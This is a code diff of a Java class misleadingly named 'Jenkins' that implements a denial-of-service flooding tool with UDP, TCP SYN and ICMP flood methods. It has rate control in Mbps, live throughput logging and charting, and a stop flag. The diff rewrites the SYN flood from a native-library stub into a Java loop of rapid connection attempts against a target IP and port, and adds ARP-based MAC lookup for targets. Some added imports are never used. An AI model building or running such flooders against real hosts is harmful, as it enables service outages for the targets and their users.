@@ -19,12 +19,22 @@ import java.net.InetSocketAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
 import java.util.Enumeration;
+import org.jnetpcap.*;
+import org.jnetpcap.packet.*;
+import org.jnetpcap.packet.format.*;
+import org.jnetpcap.protocol.*;
+import org.jnetpcap.protocol.network.*;
+import org.jnetpcap.protocol.tcpip.*;
+import java.nio.ByteBuffer;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 
 public class Jenkins {
-    private static final byte[] DEFAULT_PAYLOAD = new byte[1300]; // 1300 bytes payload
     private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
     private volatile boolean stopAttack = false;
     private TextArea logArea;
+    private String sourceIp;
+    private byte[] sourceMac;
 
     // Constructor
     public Jenkins() {
@@ -39,6 +49,7 @@ public class Jenkins {
     // UDP Flood method
     public void udpFlood(String targetIp, int targetPort, int targetMbps, ChartUpdateCallback chartCallback) {
         log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + targetMbps + " Mbps");
+        stopAttack = false;
 
         try (DatagramSocket socket = new DatagramSocket()) {
             InetAddress targetAddress = InetAddress.getByName(targetIp);
@@ -87,16 +98,63 @@ public class Jenkins {
     }
 
     // TCP SYN Flood method
-    public native boolean tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond);
+    public void tcpSynFlood(String targetIp, int targetPort, int targetMbps, ChartUpdateCallback chartCallback) {
+        log("Starting TCP SYN flood attack on " + targetIp + ":" + targetPort + " at " + targetMbps + " Mbps");
+        stopAttack = false;
 
-    static {
+        long startTime = System.currentTimeMillis();
+        long bytesSent = 0;
+        int packetsSent = 0;
+        long targetBytesPerSecond = targetMbps * 125000L; // Convert Mbps to bytes per second
+        long initialStartTime = startTime;
+
         try {
-            System.loadLibrary("tcpsynflood");
-            System.out.println("tcpsynflood library loaded successfully");
-        } catch (UnsatisfiedLinkError e) {
-            System.err.println("Failed to load tcpsynflood library: " + e.getMessage());
+            InetAddress targetAddress = InetAddress.getByName(targetIp);
+            byte[] dstMac = getDestinationMacAddress(targetAddress);
+            if (dstMac == null) {
+                log("Unable to get destination MAC address. Aborting TCP SYN flood.");
+                return;
+            }
+
+            while (!stopAttack) {
+                try (Socket socket = new Socket()) {
+                    socket.connect(new InetSocketAddress(targetAddress, targetPort), 1);
+                    // We only need to initiate the connection, not complete it
+                    socket.close();
+
+                    bytesSent += 54; // Approximate size of a SYN packet
+                    packetsSent++;
+
+                    long currentTime = System.currentTimeMillis();
+                    long elapsedTime = currentTime - startTime;
+
+                    if (elapsedTime >= 1000) {
+                        double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
+                        log(String.format("Sent %d SYN packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
+                        
+                        double elapsedTimeSeconds = (currentTime - initialStartTime) / 1000.0;
+                        chartCallback.update(elapsedTimeSeconds, actualMbps);
+                        
+                        startTime = currentTime;
+                        bytesSent = 0;
+                        packetsSent = 0;
+                    }
+
+                    // Rate limiting
+                    long expectedPacketsSent = (elapsedTime * targetBytesPerSecond) / (54 * 1000);
+                    if (packetsSent > expectedPacketsSent) {
+                        long sleepTime = (packetsSent - expectedPacketsSent) * 54 * 1000 / targetBytesPerSecond;
+                        if (sleepTime > 0) {
+                            Thread.sleep(sleepTime);
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            log("Error in TCP SYN flood: " + e.getMessage());
             e.printStackTrace();
         }
+        log("TCP SYN flood attack stopped");
     }
 
     // ICMP Flood method
@@ -167,13 +225,8 @@ public class Jenkins {
 
     public String getMacAddress(String targetIp) {
         try {
-            InetAddress address = InetAddress.getByName(targetIp);
-            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(address);
-            if (networkInterface == null) {
-                log("Network interface for the specified IP address is not available.");
-                return null;
-            }
-            byte[] mac = networkInterface.getHardwareAddress();
+            InetAddress targetAddress = InetAddress.getByName(targetIp);
+            byte[] mac = getDestinationMacAddress(targetAddress);
             if (mac == null) {
                 log("MAC address could not be retrieved.");
                 return null;
@@ -193,5 +246,59 @@ public class Jenkins {
 
     public interface ChartUpdateCallback {
         void update(double elapsedTimeSeconds, double actualMbps);
+    }
+
+    public void setSourceIp(String sourceIp) {
+        this.sourceIp = sourceIp;
+    }
+
+    public void setSourceMac(byte[] sourceMac) {
+        this.sourceMac = sourceMac;
+    }
+
+    private byte[] getDestinationMacAddress(InetAddress targetAddress) {
+        try {
+            String targetIp = targetAddress.getHostAddress();
+            ProcessBuilder pb;
+            String os = System.getProperty("os.name").toLowerCase();
+            
+            if (os.contains("win")) {
+                pb = new ProcessBuilder("arp", "-a", targetIp);
+            } else if (os.contains("mac") || os.contains("nix") || os.contains("nux")) {
+                pb = new ProcessBuilder("arp", "-e", targetIp);
+            } else {
+                log("Unsupported operating system for ARP resolution");
+                return null;
+            }
+
+            Process process = pb.start();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (line.contains(targetIp)) {
+                    String[] parts = line.split("\\s+");
+                    for (String part : parts) {
+                        if (part.matches("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")) {
+                            return macAddressToByteArray(part);
+                        }
+                    }
+                }
+            }
+            log("MAC address not found in ARP cache for IP: " + targetIp);
+            return null;
+        } catch (Exception e) {
+            log("Error in ARP resolution: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private byte[] macAddressToByteArray(String macAddress) {
+        String[] bytes = macAddress.split("[:-]");
+        byte[] macBytes = new byte[6];
+        for (int i = 0; i < 6; i++) {
+            Integer hex = Integer.parseInt(bytes[i], 16);
+            macBytes[i] = hex.byteValue();
+        }
+        return macBytes;
     }
 }
